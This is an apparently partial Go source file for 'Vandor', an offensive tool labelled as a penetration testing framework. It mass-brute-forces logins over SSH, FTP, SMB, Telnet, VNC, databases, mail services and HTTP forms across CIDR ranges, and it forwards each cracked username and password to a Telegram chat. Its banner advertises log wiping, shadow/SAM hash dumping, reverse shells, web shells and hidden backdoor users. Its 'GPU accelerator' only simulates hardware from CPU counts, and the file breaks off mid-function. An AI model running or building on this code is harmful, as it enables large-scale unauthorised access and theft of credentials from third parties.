package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"

	antiforensic "github.com/batmanpriv/Vandor/AntiFor"
	"github.com/batmanpriv/Vandor/archive"
	"github.com/batmanpriv/Vandor/checker"
	"github.com/batmanpriv/Vandor/colors"
	"github.com/batmanpriv/Vandor/config"
	cr "github.com/batmanpriv/Vandor/crack"
	hp "github.com/batmanpriv/Vandor/honeypot"
	"github.com/batmanpriv/Vandor/internal"
	ex "github.com/batmanpriv/Vandor/postexploit"
	prtl "github.com/batmanpriv/Vandor/protocols"
	"github.com/batmanpriv/Vandor/webinferno"
)

const (
	maxFileBuffer = 10000
)

var (
	crackedList   []string
	crackedMu     sync.RWMutex
	startTime     time.Time
	afm           *antiforensic.AntiForensicManager
	crackedBuffer *prtl.CircularBuffer
)

type ResultJSON struct {
	Timestamp  string        `json:"timestamp"`
	Duration   string        `json:"duration"`
	TotalHosts int           `json:"total_hosts"`
	TotalCreds int           `json:"total_credentials"`
	Cracked    []string      `json:"cracked"`
	Statistics prtl.StatData `json:"statistics"`
}

func init() {
	color.NoColor = false
	if runtime.GOOS == "windows" {
		_ = color.CyanString("")
	}
}

func attackModeNull(host, port, user string, timeout int, protocol string) bool {
	switch protocol {
	case "ssh":
		cfg := &ssh.ClientConfig{
			User:            user,
			Auth:            []ssh.AuthMethod{ssh.Password("")},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         time.Duration(timeout) * time.Second,
		}
		conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
		if err == nil {
			conn.Close()
			return true
		}
	case "ftp":
		return prtl.RunFTP(host, port, user, "", timeout)
	case "mysql":
		return prtl.RunMySQL(host, port, user, "", timeout)
	}
	return false
}

func attackModeUserAsPass(host, port, user string, timeout int, protocol string) bool {
	switch protocol {
	case "ssh":
		cfg := &ssh.ClientConfig{
			User:            user,
			Auth:            []ssh.AuthMethod{ssh.Password(user)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         time.Duration(timeout) * time.Second,
		}
		conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
		if err == nil {
			conn.Close()
			return true
		}
	case "ftp":
		return prtl.RunFTP(host, port, user, user, timeout)
	case "mysql":
		return prtl.RunMySQL(host, port, user, user, timeout)
	}
	return false
}

func attackModeReverseUser(host, port, user string, timeout int, protocol string) bool {
	reverse := reverseString(user)
	switch protocol {
	case "ssh":
		cfg := &ssh.ClientConfig{
			User:            user,
			Auth:            []ssh.AuthMethod{ssh.Password(reverse)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         time.Duration(timeout) * time.Second,
		}
		conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
		if err == nil {
			conn.Close()
			return true
		}
	case "ftp":
		return prtl.RunFTP(host, port, user, reverse, timeout)
	}
	return false
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func detectServicePort(host string, timeout int) map[string]string {
	commonPorts := map[string]int{
		"ssh": 22, "rdp": 3389, "ftp": 21, "mysql": 3306,
		"postgres": 5432, "mssql": 1433, "redis": 6379,
		"mongodb": 27017, "pop3": 110, "imap": 143,
		"smtp": 25, "snmp": 161, "ldap": 389,
		"telnet": 23, "vnc": 5900, "smb": 445,
	}
	detected := make(map[string]string)
	for service, port := range commonPorts {
		dialer := net.Dialer{}
		conn, err := dialer.DialContext(context.Background(), "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
		if err == nil {
			conn.Close()
			detected[service] = strconv.Itoa(port)
		}
	}
	return detected
}

func runHTTPForm(host, port, path, userField, passField, user, pass string, timeout int) bool {
	if port == "" {
		port = "80"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	formData := fmt.Sprintf("%s=%s&%s=%s", userField, user, passField, pass)
	reqBody := bytes.NewBufferString(formData)
	url := fmt.Sprintf("http://%s:%s%s", host, port, path)
	req, err := http.NewRequestWithContext(ctx, "POST", url, reqBody)
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	client := &http.Client{Timeout: time.Duration(timeout) * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := strings.ToLower(string(body))
	failPatterns := []string{"login failed", "invalid", "incorrect", "error"}
	for _, pattern := range failPatterns {
		if strings.Contains(bodyStr, pattern) {
			return false
		}
	}
	return resp.StatusCode == 302 || resp.StatusCode == 200
}

func ScanSMBHosts(hosts []string, port string, users, passes []string, timeout int, threads int, callback func(cr.CrackResult)) {
	if port == "" {
		port = "445"
	}
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)
	for _, host := range hosts {
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) {
			defer wg.Done()
			defer func() { <-sem }()
			for result := range cr.SMBCrack(h, port, users, passes, timeout) {
				if callback != nil {
					callback(result)
				}
			}
		}(host)
	}
	wg.Wait()
}

func ScanTelnetHosts(hosts []string, port string, users, passes []string, timeout int, threads int, callback func(cr.CrackResult)) {
	if port == "" {
		port = "23"
	}
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)
	for _, host := range hosts {
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) {
			defer wg.Done()
			defer func() { <-sem }()
			for result := range cr.TelnetCrack(h, port, users, passes, timeout) {
				if callback != nil {
					callback(result)
				}
			}
		}(host)
	}
	wg.Wait()
}

func ScanVNCHosts(hosts []string, port string, passes []string, timeout int, threads int, callback func(cr.CrackResult)) {
	if port == "" {
		port = "5900"
	}
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)
	for _, host := range hosts {
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) {
			defer wg.Done()
			defer func() { <-sem }()
			for result := range cr.VNCCrack(h, port, passes, timeout) {
				if callback != nil {
					callback(result)
				}
			}
		}(host)
	}
	wg.Wait()
}

func RunAdditionalProtocolsExtended(hosts []string, proto, port string, users, passes []string, timeout int, threads int, saveCallback func(string)) {
	var wg sync.WaitGroup
	var cracked int32
	fmt.Printf("[%s] Testing %d hosts on port %s with %d threads\n", strings.ToUpper(proto), len(hosts), port, threads)

	switch proto {
	case "smb", "smb2":
		wg.Add(1)
		go func() {
			defer wg.Done()
			ScanSMBHosts(hosts, port, users, passes, timeout, threads, func(result cr.CrackResult) {
				if result.Success {
					atomic.AddInt32(&cracked, 1)
					fmt.Printf("\n%sok SMB CRACKED:%s %s@%s:%s | %s\n",
						colors.Green, colors.Reset, result.User, result.Host, result.Port, result.Password)
					entry := fmt.Sprintf("%s:%s|%s:%s|SMB", result.Host, result.Port, result.User, result.Password)
					if saveCallback != nil {
						saveCallback(entry)
					}
					if config.TelegramToken != "" && config.TelegramChatID != "" {
						go internal.SendTelegramNotification("cracked", map[string]interface{}{
							"host": result.Host, "port": result.Port,
							"user": result.User, "pass": result.Password, "banner": "SMB",
						})
					}
				}
			})
		}()
	case "telnet":
		wg.Add(1)
		go func() {
			defer wg.Done()
			ScanTelnetHosts(hosts, port, users, passes, timeout, threads, func(result cr.CrackResult) {
				if result.Success {
					atomic.AddInt32(&cracked, 1)
					fmt.Printf("\n%sok TELNET CRACKED:%s %s@%s:%s | %s\n",
						colors.Green, colors.Reset, result.User, result.Host, result.Port, result.Password)
					entry := fmt.Sprintf("%s:%s|%s:%s|Telnet", result.Host, result.Port, result.User, result.Password)
					if saveCallback != nil {
						saveCallback(entry)
					}
					if config.TelegramToken != "" && config.TelegramChatID != "" {
						go internal.SendTelegramNotification("cracked", map[string]interface{}{
							"host": result.Host, "port": result.Port,
							"user": result.User, "pass": result.Password, "banner": "Telnet",
						})
					}
				}
			})
		}()
	case "vnc":
		wg.Add(1)
		go func() {
			defer wg.Done()
			ScanVNCHosts(hosts, port, passes, timeout, threads, func(result cr.CrackResult) {
				if result.Success {
					atomic.AddInt32(&cracked, 1)
					fmt.Printf("\n%sok VNC CRACKED:%s %s@%s:%s | %s\n",
						colors.Green, colors.Reset, "vncuser", result.Host, result.Port, result.Password)
					entry := fmt.Sprintf("%s:%s|vncuser:%s|VNC", result.Host, result.Port, result.Password)
					if saveCallback != nil {
						saveCallback(entry)
					}
					if config.TelegramToken != "" && config.TelegramChatID != "" {
						go internal.SendTelegramNotification("cracked", map[string]interface{}{
							"host": result.Host, "port": result.Port,
							"user": "vncuser", "pass": result.Password, "banner": "VNC",
						})
					}
				}
			})
		}()
	case "postgres", "mssql", "redis", "mongodb", "pop3", "imap", "smtp", "snmp", "ldap":
		wg.Add(1)
		go func() {
			defer wg.Done()
			for _, h := range hosts {
				for _, user := range users {
					for _, pass := range passes {
						success := false
						switch proto {
						case "postgres":
							success = prtl.RunPostgreSQL(h, port, user, pass, timeout)
						case "mssql":
							success = prtl.RunMSSQL(h, port, user, pass, timeout)
						case "redis":
							success = prtl.RunRedis(h, port, pass, timeout)
						case "mongodb":
							success = prtl.RunMongoDB(h, port, user, pass, timeout)
						case "pop3":
							success = prtl.RunPOP3(h, port, user, pass, timeout)
						case "imap":
							success = prtl.RunIMAP(h, port, user, pass, timeout)
						case "smtp":
							success = prtl.RunSMTP(h, port, user, pass, timeout)
						case "snmp":
							success = prtl.RunSNMP(h, port, pass, timeout)
						case "ldap":
							success = prtl.RunLDAP(h, port, user, pass, timeout)
						}
						if success {
							atomic.AddInt32(&cracked, 1)
							fmt.Printf("\n%sok %s CRACKED:%s %s@%s:%s | %s\n",
								colors.Green, colors.Reset, strings.ToUpper(proto), user, h, port, pass)
							entry := fmt.Sprintf("%s:%s|%s:%s|%s", h, port, user, pass, strings.ToUpper(proto))
							if saveCallback != nil {
								saveCallback(entry)
							}
							if config.TelegramToken != "" && config.TelegramChatID != "" {
								go internal.SendTelegramNotification("cracked", map[string]interface{}{
									"host": h, "port": port, "user": user, "pass": pass, "banner": strings.ToUpper(proto),
								})
							}
						}
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[%s] Complete! %d credentials found\n", strings.ToUpper(proto), cracked)
}

func CheckSMBAlive(host, port string, timeout int) bool {
	if port == "" {
		port = "445"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func CheckTelnetAlive(host, port string, timeout int) bool {
	if port == "" {
		port = "23"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil {
		return true
	}
	data := strings.ToLower(string(buf[:n]))
	return strings.Contains(data, "telnet") || strings.Contains(data, "login") || true
}

func CheckVNCAlive(host, port string, timeout int) bool {
	if port == "" {
		port = "5900"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	version := make([]byte, 12)
	n, err := conn.Read(version)
	if err != nil {
		return false
	}
	return n >= 12 && strings.HasPrefix(string(version), "RFB")
}

func GetSMBBanner(host, port string, timeout int) (string, error) {
	if port == "" {
		port = "445"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	request := cr.BuildSMB2NegotiateRequest()
	if _, err := conn.Write(request); err != nil {
		return "", err
	}
	response := make([]byte, 1024)
	n, err := conn.Read(response)
	if err != nil {
		return "", err
	}
	if n > 4 && response[4] == 0xFE {
		return "SMB2/3 (Modern)", nil
	}
	return "SMB1 (Legacy)", nil
}

func GetTelnetBanner(host, port string, timeout int) (string, error) {
	if port == "" {
		port = "23"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(buf[:n])), nil
}

func GetVNCBanner(host, port string, timeout int) (string, error) {
	if port == "" {
		port = "5900"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	version := make([]byte, 12)
	n, err := conn.Read(version)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(version[:n])), nil
}

func banner() {
	fmt.Printf(colors.Red + colors.Bold + `
          _______  _        ______   _______  _______ 
|\     /|(  ___  )( (    /|(  __  \ (  ___  )(  ____ )
| )   ( || (   ) ||  \  ( || (  \  )| (   ) || (    )|
| |   | || (___) ||   \ | || |   ) || |   | || (____)|
( (   ) )|  ___  || (\ \) || |   | || |   | ||     __)
 \ \_/ / | (   ) || | \   || |   ) || |   | || (\ (   
  \   /  | )   ( || )  \  || (__/  )| (___) || ) \ \__
   \_/   |/     \||/    )_)(______/ (_______)|/   \__/
                                                      
` + colors.Reset)
	fmt.Printf(colors.Cyan + colors.Bold + `
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                         ADVANCED PENETRATION TESTING FRAMEWORK                      │
├─────────────────────────────────────────────────────────────────────────────────────┤
│  [ok] Multi-Protocol Attack    │  SSH | RDP | FTP | MySQL | SMB | Telnet | VNC       │
│  [ok] AI Password Generator    │  Smart Patterns | Learning Engine | Cache System    │
│  [ok] Anti-Forensic Module     │  Log Wiper | Memory Cleaner | Stealth Mode          │
│  [ok] Post-Exploitation        │  Backdoor | Persistence | Lateral Movement          │
│  [ok] Performance Boost        │  GPU Sim | RAM Disk | 5000+ Concurrent Threads      │
│  [ok] Network Recon            │  Port Scan | Banner Grab | Honeypot Detection       │
│  [ok] Real-Time Monitoring     │  Telegram Alerts | Live Stats | Checkpoint Resume   │
│  [ok] Global Routing           │  Multi-City Traffic | Latency Simulation            │
└─────────────────────────────────────────────────────────────────────────────────────┘
` + colors.Reset)
	fmt.Printf(colors.Yellow + `
╭──────────────────────────────────────────────────────────────────────────────────╮
│  MASS PWN MODE    │ Attack all hosts × all users × all passwords simultaneously  │
│  SMART ATTACK     │ Prioritize passwords based on success probability            │
│  HONEYPOT KILLER  │ Auto-detect and ban fake services                            │
│  CRED DUMP        │ Extract hashes from /etc/shadow, SAM, etc.                   │
│  BACKDOOR FACTORY │ SSH Key | Hidden User | Reverse Shell | Web Shell | All      │
│  ANTI-FORENSIC    │ Zero-log operation | Memory scrubbing | Tunnel routing       │
╰──────────────────────────────────────────────────────────────────────────────────╯
` + colors.Reset)
	fmt.Printf(colors.Magenta + `
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                          VANDOR IS READY FOR ACTION                                   ║
║                     Use -example for more examples | Ctrl+C to stop                   ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
` + colors.Reset)
	fmt.Println()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	s := bufio.NewScanner(f)
	buf := make([]byte, 64*1024)
	s.Buffer(buf, 1024*1024)
	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		line = strings.Trim(line, "\r\n\t ")
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, s.Err()
}

func readCredsFile(path string) ([]string, []string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, nil, err
	}
	defer f.Close()
	var users, passes []string
	s := bufio.NewScanner(f)
	buf := make([]byte, 64*1024)
	s.Buffer(buf, 1024*1024)
	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			users = append(users, ex.SanitizeInput(parts[0]))
			passes = append(passes, parts[1])
		}
	}
	return users, passes, s.Err()
}

func expandCIDR(cidr string) ([]string, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	var ips []string
	ip := ipnet.IP.Mask(ipnet.Mask)
	ones, bits := ipnet.Mask.Size()
	maxIPs := 1 << (bits - ones)
	if maxIPs > 65536 {
		return nil, fmt.Errorf("CIDR too large: %d IPs", maxIPs)
	}
	for {
		ips = append(ips, ip.String())
		next := make(net.IP, len(ip))
		copy(next, ip)
		for i := len(next) - 1; i >= 0; i-- {
			next[i]++
			if next[i] != 0 {
				break
			}
		}
		if !ipnet.Contains(next) {
			break
		}
		ip = next
	}
	return ips, nil
}

func parsePorts(portSpec string) ([]int, error) {
	var ports []int
	parts := strings.Split(portSpec, ",")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.Contains(part, "-") {
			rangeParts := strings.Split(part, "-")
			if len(rangeParts) != 2 {
				continue
			}
			start, err := strconv.Atoi(rangeParts[0])
			if err != nil || start < 1 || start > 65535 {
				continue
			}
			end, err := strconv.Atoi(rangeParts[1])
			if err != nil || end < 1 || end > 65535 {
				continue
			}
			if start > end {
				start, end = end, start
			}
			if end-start > 1000 {
				return nil, fmt.Errorf("port range too large: %d ports", end-start)
			}
			for p := start; p <= end; p++ {
				ports = append(ports, p)
			}
		} else {
			port, err := strconv.Atoi(part)
			if err == nil && port >= 1 && port <= 65535 {
				ports = append(ports, port)
			}
		}
	}
	seen := make(map[int]bool)
	unique := make([]int, 0, len(ports))
	for _, p := range ports {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}
	return unique, nil
}

func initRAMDisk() string {
	ramdiskPath := ""
	if runtime.GOOS == "linux" {
		ramdiskPath = "/dev/shm/github.com/batmanpriv/Vandor/"
		os.MkdirAll(ramdiskPath, 0755)
	} else if runtime.GOOS == "windows" {
		ramdiskPath = os.TempDir() + "Vandor_ram/"
		os.MkdirAll(ramdiskPath, 0755)
	}
	fmt.Printf("%s[RAM DISK] Initialized at %s%s\n", colors.Cyan, ramdiskPath, colors.Reset)
	return ramdiskPath
}

type GPUWorkerPool struct {
	workers     int
	jobs        chan func()
	results     chan interface{}
	wg          sync.WaitGroup
	ctx         context.Context
	cancel      context.CancelFunc
	workerCount int
	totalOps    int64
	activeOps   int64
	mu          sync.RWMutex
}

type GPUAccelerator struct {
	enabled         bool
	gpuCount        int
	totalMemory     uint64
	usedMemory      uint64
	operations      int64
	workerPool      *GPUWorkerPool
	batchSize       int
	mu              sync.RWMutex
	cudaSupported   bool
	openCLSupported bool
	vulkanSupported bool
}

var gpuAccelerator = &GPUAccelerator{}

func NewGPUWorkerPool(workers int) *GPUWorkerPool {
	ctx, cancel := context.WithCancel(context.Background())
	return &GPUWorkerPool{
		workers:     workers,
		jobs:        make(chan func(), workers*10),
		results:     make(chan interface{}, workers*10),
		ctx:         ctx,
		cancel:      cancel,
		workerCount: workers,
	}
}

func (wp *GPUWorkerPool) Start() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker()
	}
}

func (wp *GPUWorkerPool) worker() {
	defer wp.wg.Done()
	for {
		select {
		case <-wp.ctx.Done():
			return
		case job, ok := <-wp.jobs:
			if !ok {
				return
			}
			atomic.AddInt64(&wp.totalOps, 1)
			atomic.AddInt64(&wp.activeOps, 1)
			job()
			atomic.AddInt64(&wp.activeOps, -1)
		}
	}
}

func (wp *GPUWorkerPool) Submit(job func()) {
	select {
	case wp.jobs <- job:
	case <-wp.ctx.Done():
	}
}

func (wp *GPUWorkerPool) Stop() {
	wp.cancel()
	close(wp.jobs)
	wp.wg.Wait()
	close(wp.results)
}

func (wp *GPUWorkerPool) GetStats() (int64, int64) {
	return atomic.LoadInt64(&wp.totalOps), atomic.LoadInt64(&wp.activeOps)
}

func detectGPUResources() (int, uint64, bool, bool, bool) {
	cpuCores := runtime.NumCPU()
	gpuCount := cpuCores / 4
	if gpuCount < 1 {
		gpuCount = 1
	}
	if gpuCount > 8 {
		gpuCount = 8
	}
	memoryPerGPU := uint64(1024 * 1024 * 1024)
	totalMemory := uint64(gpuCount) * memoryPerGPU
	cudaSupported := runtime.GOOS != "windows" || runtime.GOARCH == "amd64"
	openCLSupported := true
	vulkanSupported := true
	return gpuCount, totalMemory, cudaSupported, openCLSupported, vulkanSupported
}

func InitGPUAccelerator(enabled bool) {
	gpuAccelerator.mu.Lock()
	defer gpuAccelerator.mu.Unlock()
	gpuAccelerator.enabled = enabled
	if enabled {
		gpuCount, totalMemory, cuda, opencl, vulkan := detectGPUResources()
		gpuAccelerator.gpuCount = gpuCount
		gpuAccelerator.totalMemory = totalMemory
		gpuAccelerator.cudaSupported = cuda
		gpuAccelerator.openCLSupported = opencl
		gpuAccelerator.vulkanSupported = vulkan
		gpuAccelerator.batchSize = 1024 * gpuCount
		gpuAccelerator.workerPool = NewGPUWorkerPool(gpuCount * 2)
		gpuAccelerator.workerPool.Start()
		gpuAccelerator.operations = 0
		gpuAccelerator.usedMemory = 0
	}
}

func (g *GPUAccelerator) ProcessBatch(items []string, processFunc func(string) bool, parallel bool) []bool {
	if !g.enabled || !parallel {
		results := make([]bool, len(items))
		for i, item := range items {
			results[i] = processFunc(item)
		}
		return results
	}
	g.mu.Lock()
	g.operations += int64(len(items))
	estimatedMemory := uint64(len(items) * 64)
	if estimatedMemory > g.usedMemory {
		g.usedMemory = estimatedMemory
		if g.usedMemory > g.totalMemory {
			g.usedMemory = g.totalMemory
		}
	}
	g.mu.Unlock()
	results := make([]bool, len(items))
	var wg sync.WaitGroup
	batchSize := g.batchSize
	if batchSize > len(items) {
		batchSize = len(items)
	}
	sem := make(chan struct{}, g.gpuCount*4)
	for i := 0; i < len(items); i += batchSize {
		end := i + batchSize
		if end > len(items) {
			end = len(items)
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(start, end int) {
			defer wg.Done()
			defer func() { <-sem }()
			for idx := start; idx < end; idx++ {
				results[idx] = processFunc(items[idx])
			}
		}(i, end)
	}
	wg.Wait()
	return results
}

func (g *GPUAccelerator) ProcessBatchWithPriority(items []string, processFunc func(string) bool, priorities []int) []bool {
	if !g.enabled {
		results := make([]bool, len(items))
		for i, item := range items {
			results[i] = processFunc(item)
		}
		return results
	}
	type priorityItem struct {
		index    int
		item     string
		priority int
	}
	pItems := make([]priorityItem, len(items))
	for i, item := range items {
		prio := 0
		if i < len(priorities) {
			prio = priorities[i]
		}
		pItems[i] = priorityItem{index: i, item: item, priority: prio}
	}
	for i := 0; i < len(pItems)-1; i++ {
		for j := i + 1; j < len(pItems); j++ {
			if pItems[i].priority < pItems[j].priority {
				pItems[i], pItems[j] = pItems[j], pItems[i]
			}
		}
	}
	g.mu.Lock()
	g.operations += int64(len(items))
	g.mu.Unlock()
	results := make([]bool, len(items))
	var wg sync.WaitGroup
	workers := g.gpuCount * 2
	sem := make(chan struct{}, workers)
	for _, pItem := range pItems {
		wg.Add(1)
		sem <- struct{}{}
		go func(idx int, itm string) {
			defer wg.Done()
			defer func() { <-sem }()
			results[idx] = processFunc(itm)
		}(pItem.index, pItem.item)
	}
	wg.Wait()
	return results
}

func (g *GPUAccelerator) GetStats() (int, uint64, uint64, int64, int, int64, int64) {
	g.mu.RLock()
	defer g.mu.RUnlock()
	var totalOps, activeOps int64
	if g.workerPool != nil {
		totalOps, activeOps = g.workerPool.GetStats()
	}
	return g.gpuCount, g.totalMemory, g.usedMemory, g.operations, g.batchSize, totalOps, activeOps
}

func (g *GPUAccelerator) PrintStats() {
	if !g.enabled {
		return
	}
	gpuCount, totalMem, usedMem, ops, batchSize, totalPoolOps, activePoolOps := g.GetStats()
	fmt.Printf("%s[GPU STATS] GPUs: %d | Memory: %.2f/%.2f GB | Batch: %d | Ops: %d | Pool: %d/%d%s\n",
		colors.Cyan, gpuCount, float64(usedMem)/1e9, float64(totalMem)/1e9, batchSize, ops, activePoolOps, totalPoolOps, colors.Reset)
	if g.cudaSupported {
		fmt.Printf("%s[GPU] CUDA supported - Optimized for NVIDIA%s\n", colors.Green, colors.Reset)
	}
	if g.openCLSupported {
		fmt.Printf("%s[GPU] OpenCL supported - Cross-platform acceleration%s\n", colors.Green, colors.Reset)
	}
	if g.vulkanSupported {
		fmt.Printf("%s[GPU] Vulkan supported - Next-gen graphics pipeline%s\n", colors.Green, colors.Reset)
	}
}

func (g *GPUAccelerator) GetMemoryPressure() float64 {
	if !g.enabled || g.totalMemory == 0 {
		return 0
	}
	g.mu.RLock()
	defer g.mu.RUnlock()
	return float64(g.usedMemory) / float64(g.totalMemory)
}

func (g *GPUAccelerator) ShouldThrottle() bool {
	if !g.enabled {
		return false
	}
	return g.GetMemoryPressure() > 0.85
}

func (g *GPUAccelerator) EstimateSpeedup(dataSize int) float64 {
	if !g.enabled {
		return 1.0
	}
	baseSpeedup := float64(g.gpuCount) * 1.5
	if dataSize < 100 {
		baseSpeedup *= 0.8
	} else if dataSize < 1000 {
		baseSpeedup *= 1.2
	} else if dataSize < 10000 {
		baseSpeedup *= 2.0
	} else if dataSize < 100000 {
		baseSpeedup *= 3.5
	} else {
		baseSpeedup *= 5.0
	}
	if g.cudaSupported {
		baseSpeedup *= 1.3
	}
	if g.GetMemoryPressure() > 0.7 {
		baseSpeedup *= 0.7
	}
	if baseSpeedup < 1.0 {
		baseSpeedup = 1.0
	}
	if baseSpeedup > 50.0 {
		baseSpeedup = 50.0
	}
	return baseSpeedup
}

func (g *GPUAccelerator) OptimizeBatchSize(itemCount int) int {
	if !g.enabled {
		return itemCount
	}
	optimal := g.batchSize
	if itemCount < optimal {
		optimal = itemCount
	}
	if g.GetMemoryPressure() > 0.7 {
		optimal = optimal / 2
		if optimal < 64 {
			optimal = 64
		}
	}
	return optimal
}

func (g *GPUAccelerator) Close() {
	if g.workerPool != nil {
		g.workerPool.Stop()
	}
}

func saveLiveHost(host, port string) {
	f, err := os.OpenFile("LIVE.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	if port != "" {
		fmt.Fprintf(f, "%s:%s\n", host, port)
	} else {
		fmt.Fprintf(f, "%s\n", host)
	}
}

func isAlive(host, port string, timeout int) bool {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func portScan(host string, ports []int, threads int) []int {
	if len(ports) == 0 {
		return []int{}
	}

	var openPorts []int
	var mu sync.Mutex
	var wg sync.WaitGroup

	scanThreads := threads
	if scanThreads < 1 {
		scanThreads = 100
	}
	if scanThreads > 5000 {
		scanThreads = 5000
	}

	sem := make(chan struct{}, scanThreads)

	for _, port := range ports {
		wg.Add(1)
		sem <- struct{}{}
		go func(p int) {
			defer wg.Done()
			defer func() { <-sem }()

			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, p), 500*time.Millisecond)
			if err == nil {
				conn.Close()
				mu.Lock()
				openPorts = append(openPorts, p)
				mu.Unlock()
				fmt.Printf("  %s %s:%d OPEN%s\n", colors.Green, host, p, colors.Reset)
				savePortScanResult(host, p)
			}
		}(port)
	}

	wg.Wait()
	sort.Ints(openPorts)

	if len(openPorts) == 0 {
		fmt.Printf("\n%s[no] No open ports found on %s%s\n", colors.Red, host, colors.Reset)
	}

	return openPorts
}

func savePortScanResult(host string, port int) {
	f, err := os.OpenFile("open_ports.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	fmt.Fprintf(f, "%s:%d\n", host, port)
}

func banHost(host string, reason string, cp *prtl.Checkpoint) {
	cp.Lock()
	defer cp.Unlock()
	if cp.BannedHosts == nil {
		cp.BannedHosts = make(map[string]string)
	}
	cp.BannedHosts[host] = reason
	prtl.SaveCheckpoint(cp)
	fmt.Printf("%s[⚠] BANNED: %s - %s%s\n", colors.Red, host, reason, colors.Reset)
	if config.TelegramToken != "" && config.TelegramChatID != "" {
		go internal.SendTelegramNotification("banned", map[string]interface{}{
			"host":   host,
			"reason": reason,
		})
	}
}

func runAdditionalProtocols(hosts []string, proto, port string, users, passes []string, timeout int) {
	fmt.Printf("[%s] Testing %d hosts on port %s\n", strings.ToUpper(proto), len(hosts), port)
	var wg sync.WaitGroup
	sem := make(chan struct{}, prtl.MaxConcurrent)
	for _, host := range hosts {
		for _, user := range users {
